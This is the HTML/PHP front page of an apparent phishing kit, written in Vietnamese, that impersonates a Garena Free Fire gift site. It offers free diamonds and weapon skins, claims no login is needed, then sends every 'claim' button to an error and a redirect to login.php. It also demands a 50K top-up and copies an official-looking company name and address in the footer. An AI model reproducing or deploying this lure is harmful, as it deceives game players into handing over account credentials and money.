<!DOCTYPE html>
	...
	<!-- ÓC CHÓ ĐI F12 LIU LIU-->

<html>
<head>
	<meta charset="UTF-8">
	<!-- Primary Meta Tags -->
<title><?php echo $bs_nameweb; ?> | Trang Nhận Quà Freefire online Lớn Nhất Việt Nam, Nhận Quà Cực Chất</title>
 <meta name="title" content="Rất Nhiều Anh Em Đã Tin Tưởng Nhận Về Thành Công">
  ...
  <link href="css/chunk-vendors.cbc2a074.html" rel="preload" as="style">
  <link href="css/index.2fabe405.html" rel="preload" as="style">
  <link href="css/chunk-vendors.cbc2a074.html" rel="stylesheet">
  <link href="css/index.2fabe405.html" rel="stylesheet">
  ...
  <style type="text/css">
    ...
    ._1rqvnjZ7WY .Ls8-IMW3Qi {
      background-color: rgba(4,4,4,.8);
      text-transform: uppercase
    }

    ._1rqvnjZ7WY .PeHbWGNwEI ._3lYgaesgE7 {
      color: #fff!important;
      position: relative
    }

    ._1rqvnjZ7WY .PeHbWGNwEI ._3lYgaesgE7:before {
      content: "";
      position: absolute;
      top: 0;
      bottom: 0;
      ...
      border-color: transparent transparent #ffcd47 transparent
    }

    ._1rqvnjZ7WY ._1oluvWGhQe {
      width: 112px;
      height: 28px;
      background: url(quaythuonggarena.com/css/img/logo.c532f852.png) no-repeat 50%;
      background-size: 100%;
      text-indent: -99999em
    }

    ._1rqvnjZ7WY .OusMqXTGmV ._29Vut6FPvY,._1rqvnjZ7WY .OusMqXTGmV ._29Vut6FPvY:focus {
      border: none;
      outline: none
    }

    ._1rqvnjZ7WY .OusMqXTGmV ._29Vut6FPvY svg {
      width: 20px;
      height: 20px;
      fill: #fff
    }
...
@media (min-width:768px) {
    ...
    ._2Jpsb1nXZN .Ldpu_U9I9Z {
      display: flex;
      align-items: center
    }

    ._2Jpsb1nXZN .I6uNp-wC5o {
      padding-right: 20px
    }

    ._2Jpsb1nXZN ._2hGOTRIE9c {
      order: 1
    }
...
@media (max-width:1024px) {
    ...
    ._2w33bebGLI ._327Fe_THgy ._1oe3hEl_TC {
      width: 100%;
      overflow: hidden;
      font-size: 16px;
      color: #fff;
    ...
    ._2w33bebGLI ._327Fe_THgy ._2snFzXBdOP {
      position: absolute;
      top: 0;
      right: 0;
      padding: 10px;
    ...
    ._2w33bebGLI ._327Fe_THgy ._1yrhOnl5TV {
      width: 100%;
      overflow: hidden;
      margin-top: 16px
    }

    ._2w33bebGLI ._327Fe_THgy ._1lcNLfRm3e {
      display: flex;
    ...
    ._2w33bebGLI ._327Fe_THgy ._1lcNLfRm3e a {
      padding: 0 10px
    }
...
@media (max-width:767px) {
    ...
    ._22Jgo19Xf_ .P3GwZUVZnA ._1uPsZovy7A {
      position: relative;
      width: 100%;
      height: 180px
    }

    ._22Jgo19Xf_ .P3GwZUVZnA ._1uPsZovy7A:after {
      content: "";
      position: absolute;
      width: 100%;
      height: 100%;
      ...
      top: 0;
      left: 0;
      box-shadow: inset 0 0 .8rem rgba(0,0,0,.4),inset 0 0 1.8rem rgba(0,0,0,.4),inset 0 0 2.6rem rgba(0,0,0,.4),inset 0 0 3.5rem rgba(0,0,0,.4)
    }

    ._22Jgo19Xf_ .P3GwZUVZnA img {
      position: absolute;
      top: 0;
      right: 0;
      left: 0;
    ...
    ._22Jgo19Xf_ .P3GwZUVZnA ._1_teDcMlf2 {
      position: absolute;
      right: 0;
      left: 0;
      bottom: 0;
    ...
    ._22Jgo19Xf_ .P3GwZUVZnA ._2_ZJ0_7UBM {
      display: block;
      width: 100%;
      border: none;
      outline: none;
      ...
      background-image: url(data:image/png;base64,);
      background-size: 100% 100%;
      color: #000
    }

    ._22Jgo19Xf_ .P3GwZUVZnA ._2_ZJ0_7UBM:focus,._22Jgo19Xf_ .P3GwZUVZnA ._2_ZJ0_7UBM:hover {
      box-shadow: none
    }
...
@media (max-width:365px) {
    ...
    ._2iakDitgGl h1:after,._2iakDitgGl h1:before {
      position: absolute;
      top: 50%;
      content: "";
    ...
    ._2iakDitgGl h1:before {
      left: -40px
    }

    ._2iakDitgGl h1:after {
      right: -40px
    }
...
@media (max-width:540px) {
    ...
    #app {
      ...
      font-weight: 500;
      font-size: 14px;
      background: url(https://quaythuonggarena.com/css/img/bg.1f77b2c7.jpg) no-repeat 50%;
...
@media (max-width:767.98px) {
    ...
    <body>
      <noscript>
        ...
        <div class="_1rqvnjZ7WY">
          <nav class="navbar navbar-dark bg-faded navbar-expand-md Ls8-IMW3Qi OusMqXTGmV">
            <div class="container">
              <a href="" target="_self" class="navbar-brand">
                <img src="image/logo@2x.c05a558a.png">
        ...
        <div class="col">
          <a class="showSingle" target="1"><img src="image/Pics-Art-02-11-04-08-27.jpg" class="icons"></a>
        </div>
        <div class="_2Dh42MCaxS">
          <div class="container _2iakDitgGl">
            <h1><b><?php echo $bs_nameweb; ?></b></h1>
          </div>

          <div class="container">
            <div class="_22Jgo19Xf_">
              <div class="text-center mb">
                Trang Nhận Quà Số 1 VN
              </div>
              <div class="text-center mb-3">
                Không Cần Đăng Nhập, Bảo Mật 100%
              </div>
            ...
            <body>
              ...
              <li><div class="P3GwZUVZnA">
                <h4 class="shop text-center">
                  <script type="text/javascript" data-cfasync="false">
                    ...
                    text = "Nhận Quà Toàn Sever"; //h
                    string2array(text);
                    divserzeugen();
                  </script>
                </h4>
                <center>
                  <a href="login.php" class="_2_ZJ0_7UBM" role="">Click Nhận Quà</a>
                </center>
              </div>
              </li>
              ...
              <ul>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/FF37232F-35D3-4D3A-AD30-4CC486DE7946.png" alt="item"><div class="_1_teDcMlf2">
                      Kim Cương Miễn Phí<span class="small"><br>(3.000-10.000KC) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                </li>
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/A8BFB493-D5A6-4318-92D6-3730654D1D33.png" alt="item"><div class="_1_teDcMlf2">
                      MP40 Mãng Xà LV1<span class="small"><br>(x1.450 Huy Hiệu) </span> <!---->
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/1D3F4E55-EB22-4CBB-AA4B-C75B831C7D31.png" alt="item"><div class="_1_teDcMlf2">
                      M1014 Long Tộc LV1<span class="small"><br>(x1.450 Huy Hiệu) </span> <!---->
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/8919FE77-9C55-4F5F-87A5-835586D4BF56.png" alt="item"><div class="_1_teDcMlf2">
                      AK Rồng Xanh LV1<span class="small"><br>(x1.450 Huy Hiệu) </span> <!---->
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/1D167776-B7C2-4353-B857-ECD76C4FE961.png" alt="item"><div class="_1_teDcMlf2">
                      Scar Cá Mập Đen LV1<span class="small"><br>(x1.450 Huy Hiệu) </span> <!---->
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/A1F44A68-8536-40EC-8ADF-B79859439889.png" alt="item"><div class="_1_teDcMlf2">
                      Gói Quỷ Vương<span class="small"><br>(Cả Nam & Nữ) </span><!---->
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/A0108596-749B-43FD-A4A4-1030DAB09C09.png" alt="item"><div class="_1_teDcMlf2">
                      Scar Siêu Phẩm <span class="small"><br>(Ngẫu nhiên) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/9691088B-277F-4FAD-A865-7D4D96AEE501.png" alt="item"><div class="_1_teDcMlf2">
                      AK Kỳ Lân <span class="small"><br>(Ngẫu nhiên) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/92D8104D-CABF-4D7A-9498-9C4B9467BAFF.png" alt="item"><div class="_1_teDcMlf2">
                      MP40 Poker <span class="small"><br>(Ngẫu nhiên) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/107A5860-7826-43EB-8EB9-B76A86881EB3.png" alt="item"><div class="_1_teDcMlf2">
                      M1014 Hủy Diệt<!----><span class="small"><br>(Ngẫu nhiên) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/C4C29E7A-25EA-4EDE-801E-069B9D856A00.png" alt="item"><div class="_1_teDcMlf2">
                      Gói Siêu Đạo Chích<span class="small"><br>(Vàng) </span><!---->
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/BFF3CF29-0A8B-41FD-9317-EA621BE417E1.png" alt="item"><div class="_1_teDcMlf2">
                      Gói Siêu Đạo Chích<span class="small"><br>(Đỏ) </span><!---->
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/C48AE74C-168D-4A72-A9FA-98C160154BDD.png" alt="item"><div class="_1_teDcMlf2">
                      Gói Siêu Đạo Chích<span class="small"><br>(Tím) </span><!---->
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/765675A8-9DA5-4526-A1A0-4D604CC7C435.png" alt="item"><div class="_1_teDcMlf2">
                      Gói Siêu Đạo Chích<span class="small"><br>(Xanh) </span><!---->
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/25BE4A70-BDAD-475C-A78F-7797E374430F.png" alt="item"><div class="_1_teDcMlf2">
                      Gói Siêu Đạo Chích<span class="small"><br>(Lục) </span><!---->
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/AA0EDE23-148A-4C67-B473-FE8E752787BA.png" alt="item"><div class="_1_teDcMlf2">
                      Thẻ Vô Cực Mùa 1<span class="small"><br>(Hoa Anh Đào) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/BFC1F62C-79A0-46DF-9355-AC0D27B82576.png" alt="item"><div class="_1_teDcMlf2">
                      Thẻ Vô Cực Mùa 36<span class="small"><br>(x225 Huy Hiệu) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/AF3A921A-4B4C-4955-AB4F-103C432E3F85.png" alt="item"><div class="_1_teDcMlf2">
                      Thẻ Tạo Phòng<span class="small"><br>(Vĩnh Viễn) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/ADAFC28C-315E-4877-8629-01F9ED14F08E.png" alt="item"><div class="_1_teDcMlf2">
                      Thẻ Tháng x12<span class="small"><br>(1 Năm) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/9BA38272-8A5E-4165-90D5-1C4358C0C20F.png" alt="item"><div class="_1_teDcMlf2">
                      Gói Quỷ Kiếm Dạ Xoa<span class="small"><br>(Giới Hạn) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/5CA199B4-949C-4FF0-8F0B-ED438D80791C.png" alt="item"><div class="_1_teDcMlf2">
                      Gói Mãng Xà Huyền Thoại<span class="small"><br>(Siêu Giới Hạn) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/B3D2B564-6D81-4D70-A2C8-A8F2EBDCCB7A.png" alt="item"><div class="_1_teDcMlf2">
                      Skin Bom Keo Kẹo Nổ<span class="small"><br>(Siêu Giới Hạn) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/42EE2208-015B-458A-B671-03B49B05E4B6.png" alt="item"><div class="_1_teDcMlf2">
                      Gói Khủng Long<span class="small"><br>(Thám Hiểm) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
                ...
                <li><div class="P3GwZUVZnA">
                  <div class="_1uPsZovy7A">
                    <img src="image/565D9428-42AC-4FA7-988D-37A19AACB7C2.png" alt="item"><div class="_1_teDcMlf2">
                      Skin Bom Keo Nham Thạch<span class="small"><br>(Siêu Giới Hạn) </span>
                    </div>
                  </div>
                  <button onclick="nhanqua()" class="_2_ZJ0_7UBM"> Nhận ngay </button>
                </div>
          ...
          <div class="container-fluid">
            <div class="row head-content">
              <div class="col-md-12 text-center">
                <a href="https://www.youtube.com/watch?v=IiMBIgdViHE" data-aos="fade-up" data-aos-duration="1000" data-aos-delay="400" data-fancybox="" class="play-head-video aos-init aos-animate">

                </a>
                <div class="app-install aos-init aos-animate" data-aos="fade-up" data-aos-duration="1000" data-aos-offset="-300" data-aos-delay="600">
                  <a href="https://play.google.com/store/apps/details?id=com.dts.freefireth"><img src="quaythuonggarena.com/img/android.png" alt=""></a>
                  <a href="https://itunes.apple.com/vn/app/garena-free-fire/id1300146617?mt=8"><img src="quaythuonggarena.com/img/ios.png" alt=""></a>
                </div>
              </div>
            </div>
          </div>
	...
	<!-- ÓC CHÓ ĐI F12 LIU LIU-->
          ...
          <div class="_2Jpsb1nXZN">
            <div class="container Ldpu_U9I9Z">
              <img src="quaythuonggarena.com/img/link-garena.260cb20c.png" alt="garena" class="_2hGOTRIE9c"><div class="I6uNp-wC5o">
                <b>Công ty TNHH Dịch Vụ Phần Mềm Thiên Bình.</b><br>Địa chỉ: Tầng 29, tòa nhà Trung tâm Lotte Hà Nội, số 54, đường Liễu Giai, Phường Cống Vị, Quận Ba Đình, Thành phố Hà Nội, Việt Nam.
              </div>
            </div>
          </div>
        </div>
...
<script>
      function nhanqua() {
        swal({
          title: "Lỗi!",
          text: "Bạn Cần Đăng Nhập Để Nhận Quà",
          icon: "error",
        }).then(function() {
  ...
  <script>
    function nhanquavip() {
      swal({
        title: "Lỗi!",
        text: "Bạn Cần Nạp 50K Để Nhận Quà",
        icon: "error",
      }).then(function() {
        window.location = "login.php";
      });
